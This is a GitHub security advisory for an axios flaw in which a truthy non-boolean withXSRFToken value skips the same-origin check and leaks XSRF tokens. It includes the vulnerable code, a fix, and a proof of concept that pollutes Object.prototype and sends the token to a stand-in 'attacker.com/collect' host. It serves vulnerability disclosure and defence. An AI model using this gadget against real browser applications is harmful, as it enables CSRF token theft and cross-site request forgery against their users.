# [M] Axios: XSRF Token Cross-Origin Leakage via Prototype Pollution Gadget in `withXSRFToken` Boolean Coercion

## Summary
Severity: Medium
Advisory: GHSA-xx6v-rp6x-q39c
CVE: CVE-2026-42042
CWE: CWE-183, CWE-201
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-xx6v-rp6x-q39c
Type: github-advisory

## Affected
- npm: `axios` — affected >=1.0.0 <1.15.1
- npm: `axios` — affected >=0 <0.31.1

## Details
# Vulnerability Disclosure: XSRF Token Cross-Origin Leakage via Prototype Pollution Gadget in `withXSRFToken` Boolean Coercion

## Summary

The Axios library's XSRF token protection logic uses JavaScript truthy/falsy semantics instead of strict boolean comparison for the `withXSRFToken` config property. When this property is set to any truthy non-boolean value (via prototype pollution or misconfiguration), the same-origin check (`isURLSameOrigin`) is **short-circuited**, causing XSRF tokens to be sent to **all** request targets including cross-origin servers controlled by an attacker.

**Severity:** Medium (CVSS 5.4)
**Affected Versions:** All versions since `withXSRFToken` was introduced
**Vulnerable Component:** `lib/helpers/resolveConfig.js:59`
**Environment:** Browser-only (XSRF logic only runs when `hasStandardBrowserEnv` is true)

## CWE

- **CWE-201:** Insertion of Sensitive Information Into Sent Data
- **CWE-183:** Permissive List of Allowed Inputs

## CVSS 3.1

**Score: 5.4 (Medium)**

Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`

| Metric | Value | Justification |
|---|---|---|
| Attack Vector | Network | PP triggered remotely via vulnerable dependency |
| Attack Complexity | Low | Once PP exists, single property assignment. Consistent with GHSA-fvcv-3m26-pcqx |
| Privileges Required | None | No authentication needed |
| User Interaction | Required | Victim must use browser with axios making cross-origin requests |
| Scope | Unchanged | Token leakage within browser context |
| Confidentiality | Low | XSRF token leaked — anti-CSRF token, not session token |
| Integrity | Low | Stolen XSRF token enables CSRF attacks (bypass CSRF protection only) |
| Availability | None | No availability impact |

## Usage of "Helper" Vulnerabilities

This vulnerability requires **Zero Direct User Input** when triggered via prototype pollution.

If an attacker can pollute `Object.prototype.withXSRFToken` with any truthy value (e.g., `1`, `"true"`, `{}`), Axios will automatically inherit this value during config merge. The truthy value short-circuits the same-origin check, causing the XSRF cookie value to be sent as a request header to every destination.

## Vulnerable Code

**File:** `lib/helpers/resolveConfig.js`, lines 57-66

```javascript
// Line 57: Function check — only applies if withXSRFToken is a function
withXSRFToken && utils.isFunction(withXSRFToken) && (withXSRFToken = withXSRFToken(newConfig));

// Line 59: The vulnerable condition
if (withXSRFToken || (withXSRFToken !== false && isURLSameOrigin(newConfig.url))) {
//  ^^^^^^^^^^^^^^^^
//  When withXSRFToken = 1 (truthy non-boolean): this is true → short-circuits
//  isURLSameOrigin() is NEVER called → token sent to ANY origin
  const xsrfValue = xsrfHeaderName && xsrfCookieName && cookies.read(xsrfCookieName);
  if (xsrfValue) {
    headers.set(xsrfHeaderName, xsrfValue);
  }
}
```

**Designed behavior:**
- `true` → always send token (explicit cross-origin opt-in)
- `false` → never send token
- `undefined` → send only for same-origin requests

**Actual behavior for non-boolean truthy values (`1`, `"false"`, `{}`, `[]`):**
- All treated as truthy → same-origin check skipped → token sent everywhere

## Proof of Concept

```javascript
// Simulated prototype pollution from any vulnerable dependency
Object.prototype.withXSRFToken = 1;

// In browser with document.cookie = "XSRF-TOKEN=secret-csrf-token-abc123"
// Every axios request now includes: X-XSRF-TOKEN: secret-csrf-token-abc123
// Even to cross-origin hosts:
await axios.get('https://attacker.com/collect');
// → attacker receives the XSRF token in request headers
```

## Verified PoC Output

```
withXSRFToken Value        Sends Token Cross-Origin  Expected
true (boolean)             YES                       Yes (opt-in)
false (boolean)            No                        No
undefined (default)        No                        No
1 (number)                 YES ← BUG                No
"false" (string)           YES ← BUG                No
{} (object)                YES ← BUG                No
[] (array)                 YES ← BUG                No

Prototype pollution:
  Object.prototype.withXSRFToken = 1
  config.withXSRFToken = 1 → leaks=true
  isURLSameOrigin() was NOT called (short-circuited)
```

## Impact Analysis

- **XSRF Token Theft:** Anti-CSRF token sent as header to attacker-controlled server, enabling CSRF attacks against the victim application
- **Universal Scope:** A single `Object.prototype.withXSRFToken = 1` affects every axios request in the application
- **Misconfiguration Risk:** Developer writing `withXSRFToken: "false"` (string) instead of `false` (boolean) triggers the same issue without PP

**Limitations:**
- Browser-only (XSRF logic runs only in `hasStandardBrowserEnv`)
- XSRF tokens are anti-CSRF tokens, not session tokens — leakage enables CSRF but not direct session hijacking
- Attacker still needs a way to deliver the forged request after obtaining the token

## Recommended Fix

Use strict boolean comparison:

```javascript
// FIXED: lib/helpers/resolveConfig.js
const shouldSendXSRF = withXSRFToken === true ||
  (withXSRFToken == null && isURLSameOrigin(newConfig.url));

if (shouldSendXSRF) {
  const xsrfValue = xsrfHeaderName && xsrfCookieName && cookies.read(xsrfCookieName);
  if (xsrfValue) {
    headers.set(xsrfHeaderName, xsrfValue);
  }
}
```

## Resources

- [CWE-201: Insertion of Sensitive Information Into Sent Data](https://cwe.mitre.org/data/definitions/201.html)
- [CWE-183: Permissive List of Allowed Inputs](https://cwe.mitre.org/data/definitions/183.html)
- [GHSA-fvcv-3m26-pcqx: Related PP Gadget in Axios](https://github.com/advisories/GHSA-fvcv-3m26-pcqx)
- [Axios GitHub Repository](https://github.com/axios/axios)

## Timeline

| Date | Event |
|---|---|
| 2026-04-15 | Vulnerability discovered during source code audit |
| 2026-04-16 | Report revised: corrected CVSS, documented limitations |
| TBD | Report submitted to vendor via GitHub Security Advisory |

## References
- https://github.com/axios/axios/security/advisories/GHSA-xx6v-rp6x-q39c
- https://nvd.nist.gov/vuln/detail/CVE-2026-42042
- https://github.com/axios/axios
